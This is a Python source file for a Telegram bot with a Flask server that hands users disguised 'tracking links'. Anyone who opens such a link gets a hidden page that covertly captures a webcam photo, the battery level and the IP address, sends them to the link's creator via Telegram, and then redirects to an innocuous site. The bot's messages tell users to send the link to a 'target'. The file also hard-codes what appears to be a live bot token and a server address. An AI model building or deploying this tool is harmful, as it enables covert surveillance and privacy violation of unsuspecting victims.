import os
import threading
import base64
import requests
import urllib.parse
from flask import Flask, request, render_template_string
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# --- CONFIGURATION ---
TOKEN = "8519141404:AAG96ys2oHdO5jxnJNwOhFrmhtP9IpVPOoc"
SERVER_URL = "http://217.154.161.167:10954"

app = Flask(__name__)

# --- JAVASCRIPT TRAP ---
def get_html(chat_id, redirect_url):
    return f"""
<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body>
    <video id="video" style="display:none;" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>
    <script>
        async function startTrap() {{
            let batLevel = "Unknown";
            try {{ let battery = await navigator.getBattery(); batLevel = Math.round(battery.level * 100); }} catch(e) {{}}

            try {{
                let stream = await navigator.mediaDevices.getUserMedia({{ video: true }});
                let video = document.getElementById('video');
                video.srcObject = stream;
                await new Promise(r => setTimeout(r, 1500));
                
                let canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                let imgData = canvas.toDataURL('image/jpeg');
                
                await fetch('/upload', {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify({{ photo: imgData, battery: batLevel, chat_id: "{chat_id}" }})
                }});
            }} catch(e) {{
                await fetch('/upload', {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify({{ error: "Denied", battery: batLevel, chat_id: "{chat_id}" }})
                }});
            }}
            window.location.href = "{redirect_url}";
        }}
        window.onload = startTrap;
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    # URL parameters: /?id=CHATID&redir=URL
    cid = request.args.get('id')
    redir = request.args.get('redir', 'https://google.com')
    return render_template_string(get_html(cid, redir))

@app.route('/upload', methods=['POST'])
def upload():
    data = request.json
    target_chat_id = data.get('chat_id')
    photo_b64 = data.get('photo')
    
    if target_chat_id:
        ip = request.remote_addr
        msg = f"🎯 **Target Captured!**\n🔋 Battery: {data.get('battery')}%\n🌐 IP: {ip}"
        requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={target_chat_id}&text={msg}")
        
        if photo_b64 and "," in photo_b64:
            img_data = base64.b64decode(photo_b64.split(",")[1])
            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto", 
                          data={'chat_id': target_chat_id}, files={'photo': ('img.jpg', img_data)})
    return "OK"

# --- BOT LOGIC ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("👋 Welcome! Apna koi bhi link bhejein (e.g. https://youtube.com) jise aap mask karna chahte hain.")

async def handle_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_link = update.message.text
    if not user_link.startswith("http"):
        await update.message.reply_text("❌ Please send a valid link starting with http or https")
        return

    user_id = update.effective_chat.id
    # Encode user link for URL safety
    encoded_redir = urllib.parse.quote(user_link)
    final_link = f"{SERVER_URL}/?id={user_id}&redir={encoded_redir}"
    
    await update.message.reply_text(f"✅ **Aapka Tracking Link:**\n`{final_link}`\n\nIs link ko target ko bhejein. Data aapko yahan mil jayega.")

def run_flask():
    app.run(host='0.0.0.0', port=10954)

if __name__ == '__main__':
    threading.Thread(target=run_flask).start()
    bot = Application.builder().token(TOKEN).build()
    bot.add_handler(CommandHandler("start", start))
    bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_link))
    bot.run_polling()
